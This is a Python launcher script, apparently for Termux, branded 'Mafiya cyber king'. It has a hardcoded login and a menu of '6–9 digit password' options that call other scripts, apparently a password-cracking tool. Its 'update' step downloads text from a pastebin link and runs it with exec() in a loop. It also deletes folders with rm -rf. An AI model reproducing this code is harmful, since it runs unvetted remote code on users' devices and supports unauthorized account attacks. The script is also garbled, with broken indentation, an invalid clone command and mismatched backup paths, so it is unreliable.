version="2.3.6"

#IMPORT

import getpass,time,os,sys

import signal

import time,os,sys

import sys, random

import threading,time

#CVALUE

blue= '\33[94m'

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan = "\033[96m"

end = '\033[0m'

black="\033[0;30m"

line=yellow+"======================================================================================================================"+end

space=" "

logo=red+str("""

\x1b[94m

╔═══╦╗─╔╦═══╦╗╔╗╔╦═══╦╗─╔╦╗─╔╦═══╦╗──╔╗

║╔═╗║║─║║╔═╗║║║║║╠╗╔╗║║─║║║─║║╔═╗║╚╗╔╝║

║║─╚╣╚═╝║║─║║║║║║║║║║║╚═╝║║─║║╚═╝╠╗╚╝╔╝

║║─╔╣╔═╗║║─║║╚╝╚╝║║║║║╔═╗║║─║║╔╗╔╝╚╗╔╝

║╚═╝║║─║║╚═╝╠╗╔╗╔╬╝╚╝║║─║║╚═╝║║║╚╗─║║

╚═══╩╝─╚╩═══╝╚╝╚╝╚═══╩╝─╚╩═══╩╝╚═╝─╚╝""")

notice=""

def header():

	print(logo+cyan+"\n\n\n\t\tDeveloped By : Md alamin\n\n"+green+"\t\t Version : "+str(version)+" \n\n"+end+line+"\n"+end)

def clear():

os.system("clear || cls")

count=1

erase = '\x1b[1A\x1b[2K'

count=1

about=12

x=3

while x<5:

user=str(input(red+"\n ?? USERNAME : "))

passw=str(input(green+"\n ☣️PASSWORD : "))

if user=="Nilltah" and passw=="koliza":

print("Login Succcessfull")

sys.stdout.flush()

time.sleep(2) 

os.system("xdg-open https://www.facebook.com/Mdalamin54321")

x=8

else:

	print(red+"\n\t⚠️username or password incorrect⚠️ ")

	os.system("xdg-open https://www.facebook.com/Mdalamin54321")

	x=3

os.system("clear")

header()

print(cyan+"\n\t\t[•] Checking For Updates")

time.sleep(0.7)

try:

	import requests

except:

	os.system("pip install requests")

import requests

r=requests.get('https://pastebin.com/4YKFarFn')

upchck=r.text

if upchck==version:

	pass

elif upchck!=version:

	os.system("clear")

	header()

	print(cyan+"\n [°] Installing The Updated Tools. Allow Up to 10 minutes ")

	time.sleep(2)

	os.system("clear")

	notice=cyan+"\t\t[°] Installing Updated Tools.. \n"

	header()

	notice=""

	print("\n")

	clear()

	notice=cyan+"\t\t[•] Backing up the Mafiya cybet king ...."

	header()

	os.system("mkdir $HOME/z_updater")

	os.system("cp -rf $HOME/z $HOME/j_updater")

	try:

		clear()

		notice=cyan+"\t\t[•] Updating the Tools...."

		header()

		os.system("cd $HOME")

		os.system("cd $HOME && rm -rf z ")

		print(green)

		os.system("cd $HOME && https://github.com/HANTER2/z")

		

		clear()

		notice=green+"\t\t[√] Update Successful!"

		header()

		#os.kill(os.getppid(), signal.SIGHUP)

		os.system("rm -rf $HOME/z_updater")

		for i in range(99999999999):

			r2=requests.get("https://pastebin.com/4YKFarFn")

			r=requests.get('https://pastebin.com/4YKFarFn')

			upchck=r.text

			os.system("clear")

			print(green+"\n"*4+"\t [✓] Successfully Updated to Mafiya cyber king "+yellow+str(upchck)+green+" !\n\n\n\n"+cyan+" [•] What's New in Version "+str(upchck)+" ?\n\n")

			rng=r2.text

			exec(rng)

			print(yellow+"\n\n\n [•••] TerMux Restart is Required for The Update. Please Restart Termux For The Mafiya cyber king Updated Version")

			a=input()

	except:

		clear()

		notice=red+"\t\t[×] Update Failed!"

		header()

		sjsjstshsb=input(cyan+"\n\n\t Press Enter to Restore ROC-X")

		os.system("cd $HOME")

		os.system("cd $HOME && mkdir z ")

		os.system("cd $HOME && cp -rf $HOME/i_updater/z $HOME")

		os.system("rm -rf $HOME/z_updater")

		os.system("python3 $HOME/z/main2.py")

		for i in range(99999999999):

			os.system("clear")

			a=input()

#Main Page

while count<2:

	clear()

	header()

	notice=""

	print(cyan+"\n==> Select the number of the option that you want to start from below : ")

	print("\n\n[1] 6 Digit Password \n\n[2] 7 Digit Password \n\n[3] 8 Digit Password\n\n[4] 9 Digit Password \n\n[5] Contact Me\n[6] uuuu")

	

	

	main_opt=str(input(blue+"\n[>] Select Your Option : "+yellow))

	if main_opt=="1":

		os.system("python newfile.py")

		

	

	elif main_opt=="2":

		os.system("python newfile.py2")

		

	

	elif main_opt=="3":

		os.system("python newfile.py3 ")

	elif main_opt=="4":

		os.system("python newfile.py4")

	elif main_opt=="5":

		os.system("xdg-open https://www.facebook.com/Mdalamin54321")

	

		

		

	else:

		clear()

		notice=red+"\t\t[×] Wrong Option Entered!"

		count=1

